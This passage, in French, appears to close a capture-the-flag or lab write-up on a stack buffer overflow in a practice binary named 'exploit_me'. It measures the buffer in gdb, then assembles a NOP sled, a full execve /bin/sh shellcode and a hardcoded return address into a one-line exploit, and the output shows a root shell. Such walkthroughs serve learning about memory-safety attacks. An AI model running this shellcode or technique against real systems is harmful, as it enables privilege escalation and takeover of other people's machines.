On fait alors la différence entre les addresses:
```
(gdb) p/d 0xbffff6cc - 0xbffff640
$12 = 140
```
On sait donc que notre exploitation doit tenir dans ce buffer. En suivant plusieurs techniques, voici comment on a procédé:  
1. un padding de "\x90" qui correspond à l'opcode `NOP`, soit, No Operation, qui ne fait donc rien.
2. un *shellcode*, une chaine de caractère en hexa qui est la transcription d'un petit script shell, ici pour ouvrir un shell.
`\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh`. On en trouve des similaires sur [shell-storm](http://shell-storm.org/shellcode/) par exemple.
3. Une adresse finale connue du programme puisqu'elle suit celle du registre `eip`, `eip` + 4. En hexa et en little endian, ça donne ceci: `"\xd0\xf6\xff\xbf"`

On peut alors assembler tout ceci et lancer notre binaire avec la concaténation de ces 3 strings:
```bash
./exploit_me `python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xd0\xf6\xff\xbf"'`
```

Et...
```sh
# whoami
root
```
💥💥💥💥💥  
**F.I.N.**
